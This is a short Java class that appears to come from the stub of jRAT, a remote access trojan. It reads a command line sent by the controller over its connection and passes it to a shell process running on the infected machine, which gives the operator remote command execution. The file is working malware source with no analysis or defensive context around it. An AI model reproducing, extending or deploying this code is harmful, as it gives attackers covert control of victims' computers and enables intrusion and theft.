package se.jrat.stub.packets.incoming;

import java.io.PrintWriter;

import se.jrat.stub.Connection;
import se.jrat.stub.LaunchProcess;


public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String line = con.readLine();
		
		PrintWriter input = new PrintWriter(LaunchProcess.getLatest().getProcess().getOutputStream(), true);
		input.println(line);
	}

}
